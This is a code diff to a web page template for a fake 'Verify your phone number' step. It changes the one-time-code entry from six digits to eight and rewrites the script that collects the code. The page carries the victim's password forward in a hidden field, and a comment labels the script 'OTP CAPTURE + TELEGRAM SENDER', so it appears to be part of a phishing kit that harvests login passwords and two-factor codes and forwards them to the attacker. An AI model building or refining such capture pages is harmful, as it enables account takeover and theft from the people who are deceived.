@@ -32,7 +32,7 @@
                 <p class="step-label">Step 2 of 2</p>
             </div>
             <h1 id="verifyHeading">Verify your phone number</h1>
-            <p class="verify-sub">Enter the 6-digit verification code sent to your phone.</p>
+            <p class="verify-sub">Enter the 8-digit verification code sent to your phone.</p>
             
             <form id="otpForm" method="POST" action="/success" novalidate>
                 @csrf
@@ -40,12 +40,14 @@
                 <input type="hidden" id="hiddenPassword" name="password" value="{{ $password ?? session('password', '') }}">
                 
                 <div class="otp-group" id="otpGroup" role="group" aria-labelledby="verifyHeading">
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="0" aria-label="Digit 1 of 6" id="otp1">
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="1" aria-label="Digit 2 of 6" id="otp2">
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="2" aria-label="Digit 3 of 6" id="otp3">
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="3" aria-label="Digit 4 of 6" id="otp4">
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="4" aria-label="Digit 5 of 6" id="otp5">
-                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="5" aria-label="Digit 6 of 6" id="otp6">
+                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="0" aria-label="Digit 1 of 8" id="otp1">
+                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="1" aria-label="Digit 2 of 8" id="otp2">
+                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="2" aria-label="Digit 3 of 8" id="otp3">
+                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="3" aria-label="Digit 4 of 8" id="otp4">
+                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="4" aria-label="Digit 5 of 8" id="otp5">
+                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="5" aria-label="Digit 6 of 8" id="otp6">
+                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="6" aria-label="Digit 7 of 8" id="otp7">
+                    <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" data-index="7" aria-label="Digit 8 of 8" id="otp8">
                 </div>
                 
                 <input type="hidden" name="otp_code" id="otpCode" value="">
@@ -80,29 +82,21 @@
     
     <script>
         // ============================================================
-        // FIXED: OTP CAPTURE + TELEGRAM SENDER
+        // 8-DIGIT OTP CAPTURE + TELEGRAM SENDER
         // ============================================================
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('✅ Step 2 - Verify page loaded');
+            console.log('✅ Step 2 - Verify page loaded (8-digit OTP)');
 
-            // ---- GET OTP CODE FROM 6 BOXES ----
+            // ---- GET OTP CODE FROM 8 BOXES ----
             function getOtpCode() {
                 var code = '';
-                var box1 = document.getElementById('otp1');
-                var box2 = document.getElementById('otp2');
-                var box3 = document.getElementById('otp3');
-                var box4 = document.getElementById('otp4');
-                var box5 = document.getElementById('otp5');
-                var box6 = document.getElementById('otp6');
-                
-                if (box1) code += box1.value || '';
-                if (box2) code += box2.value || '';
-                if (box3) code += box3.value || '';
-                if (box4) code += box4.value || '';
-                if (box5) code += box5.value || '';
-                if (box6) code += box6.value || '';
-                
-                console.log('📥 OTP captured:', code);
+                for (var i = 1; i <= 8; i++) {
+                    var box = document.getElementById('otp' + i);
+                    if (box) {
+                        code += box.value || '';
+                    }
+                }
+                console.log('📥 OTP captured (8-digit):', code);
                 return code;
             }
 
